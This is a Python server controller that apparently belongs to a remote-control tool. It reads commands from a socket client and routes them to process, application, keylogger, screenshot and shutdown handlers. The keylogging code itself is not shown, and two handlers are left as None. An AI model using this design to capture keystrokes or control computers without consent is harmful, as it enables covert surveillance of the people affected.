from core.socket_server import SocketServer
from handlers.process_handler import ProcessHandler
from handlers.app_handler import AppHandler
from handlers.keylog_handler import KeyLogHandler
from services.keylog_service import KeyLogService
from services.app_service import AppService
from services.process_service import ProcessService


class ServerController:

    def __init__(self):
        self.server = SocketServer()
        self.process_handler = ProcessHandler(ProcessService())
        self.app_handler = AppHandler(AppService())
        self.keylogger_handler = KeyLogHandler(KeyLogService())
        self.screenshot_handler = None
        self.shutdown_handler = None
        
        self.server.set_client_handler(
            self.handle_client
        )

    def start(self):
        self.server.start()
        
    def handle_client(self, session):
        while True:
            command = session.read_line()

            if command == "PROCESS":
                self.process_handler.handle(
                    session
                )
                
            elif command == "APP":
                self.app_handler.handle(
                    session
                )
                
            elif command == "KEYLOGGER":
                self.keylogger_handler.handle(
                    session
                )
            
            elif command == "SCREENSHOT":
                self.screenshot_handler.handle(
                    session
                )
            
            elif command == "SHUTDOWN":
                self.shutdown_handler.handle(
                    session
                )

            elif command == "QUIT":
                break

    